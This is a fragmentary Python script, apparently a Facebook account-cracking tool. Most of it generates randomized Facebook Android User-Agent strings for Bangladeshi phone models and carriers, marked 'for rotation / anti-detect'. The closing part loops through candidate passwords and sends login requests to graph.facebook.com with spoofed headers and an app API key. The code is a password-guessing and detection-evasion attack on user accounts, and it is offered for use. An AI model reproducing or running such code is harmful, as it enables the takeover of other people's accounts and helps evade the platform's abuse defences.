...
def get_dalvik_bd_sv(mode="random"):
    """
    mode: "random" or "fixed"
    Returns a Dalvik-style User-Agent string tailored for BD devices.
    """
    # Shared fields
    fban = "FB4A"
    ...
    if mode == "fixed":
        # Stable fixed UA
        facebook_version = "455.0.0.25.106"
        fbbv = "70707070"
        density = "2.0"
        width = "1080"
        height = "2400"
        ...
        # Randomized realistic UA (use for rotation / anti-detect)
        facebook_version = f"{random.randint(350, 460)}.0.0.{random.randint(1, 40)}.{random.randint(50, 200)}"
        ...
        devices = [
            ...
            ("Xiaomi", "Poco X6 Pro"), ("Xiaomi", "Poco F5"),
            ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A54"),
            ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"),
            ("Realme", "Realme C55"), ("Realme", "Realme Narzo 60"), ("Realme", "Realme 12 Pro"),
            ("Oppo", "Oppo A78"), ("Oppo", "Oppo F23"), ("Oppo", "Oppo Reno 10"),
            ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V27"), ("Vivo", "Vivo V29e"),
            ("Infinix", "Infinix Note 30"), ("Infinix", "Infinix Hot 40i"),
            ("Tecno", "Tecno Spark 20"), ("Tecno", "Tecno Camon 20"),
            ("Symphony", "Symphony Z60"), ("Walton", "Walton Primo H10"),
    ...
    END = (
        ...
        f"FBDV/{fbdv};FBSV/{fbsv};FBOP/{fbop};FBCA/{fbca};]"
    )
...
if __name__ == "__main__":
    print("Random UA:", get_dalvik_bd_sv("random"))
    print("Fixed UA :", get_dalvik_bd_sv("fixed"))
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
...
def random_dalvik_all_models():
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent
    covering all popular phone models (BD + Global).
    """
    fban = "FB4A"
    fbpn = "com.facebook.katana"
    ...
    # জনপ্রিয় ফোন মডেল (BD + Global mix)
    devices = [
        # Samsung
    ...
    ua = (
        ...
        f"Build/TP1A.{random.randint(220000, 240000)}.{random.randint(100,999)}) "
        f"[FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};FBPN/{fbpn};FBLC/en_US;FBDV/{model};"
        f"FBSV/{release};FBCA/armeabi-v7a:armeabi;FBDM/{{density={density}}};FB_FW/1;]"
    )
    return ua
...
def random_dalvik_bd_all():
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent
    covering all popular BD + global devices.
    Returns:
        str: A working UA string
    """

    fban = "FB4A"
    fbpn = "com.facebook.katana"

    # Facebook app version (latest ~400–490 realistic range)
    facebook_version = f"{random.randint(400, 490)}.0.0.{random.randint(10, 60)}.{random.randint(70, 220)}"
    fbbv = str(random.randint(200000000, 400000000))

    # Display density & resolution
    density = random.choice(["2.0", "2.25", "2.5", "2.75", "3.0", "3.25", "3.5"])
    width = random.choice(["720", "1080", "1170", "1200", "1440"])
    height = random.choice(["1520", "1600", "1792", "1920", "2340", "2400", "2460", "2560"])

    # Carriers
    fbcr = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk", "Unknown"])
    fblc = random.choice(["bn_BD", "en_US"])

    # Device list (BD + Global)
    devices = [
        # Xiaomi / Poco / Redmi
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 11 Pro"),
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 10"), ("Xiaomi", "Poco X6 Pro"),
        ("Xiaomi", "Poco X5"), ("Xiaomi", "Poco F5"), ("Xiaomi", "Mi 11 Ultra"),

        # Samsung
        ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25"),
        ("Samsung", "Galaxy A54"), ("Samsung", "Galaxy M14"), ("Samsung", "Galaxy M54"),
        ("Samsung", "Galaxy S21 Ultra"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"),

        # Realme
        ("Realme", "Realme C55"), ("Realme", "Realme C53"), ("Realme", "Realme Narzo 60"),
        ("Realme", "Realme Narzo 60x"), ("Realme", "Realme 11x"), ("Realme", "Realme 12 Pro"),
        ("Realme", "Realme 12 Pro+"), ("Realme", "Realme GT Neo 3"),

        # Oppo
        ("Oppo", "Oppo A78"), ("Oppo", "Oppo F23"), ("Oppo", "Oppo F25"),
        ("Oppo", "Oppo Reno 10"), ("Oppo", "Oppo Reno 11"), ("Oppo", "Oppo A79"),

        # Vivo
        ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V27"), ("Vivo", "Vivo V29e"),
        ("Vivo", "Vivo Y100"), ("Vivo", "Vivo Y02s"), ("Vivo", "Vivo V30"),

        # Infinix
        ("Infinix", "Infinix Note 30"), ("Infinix", "Infinix Note 40"),
        ("Infinix", "Infinix Hot 40i"), ("Infinix", "Infinix GT 20 Pro"),

        # Tecno
        ("Tecno", "Tecno Spark 20"), ("Tecno", "Tecno Spark 20 Pro"),
        ("Tecno", "Tecno Camon 20"), ("Tecno", "Tecno Camon 30"),

        # Symphony & Walton
        ("Symphony", "Symphony Z60"), ("Symphony", "Symphony i120"),
        ("Walton", "Walton Primo H10"), ("Walton", "Walton Primo S8"),

        # Itel
        ("Itel", "Itel A70"), ("Itel", "Itel A70 Pro"), ("Itel", "Itel S23"), ("Itel", "Itel S23+"),

        # Global
        ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus Nord 3"),
        ("Google", "Pixel 7"), ("Google", "Pixel 8 Pro"),
        ("Huawei", "Huawei Nova 11"), ("Huawei", "Huawei P60 Pro")
    ]
    ...
    # Build tags (latest tags)
    build = random.choice([
        "UP1A.240905.001", "UP1A.240605.004", "TQ3A.240805.002",
        "TP1A.221005.003", "SP2A.220405.004", "RQ3A.210905.001"
    ])
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 6.3
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_models(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_bd_all(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
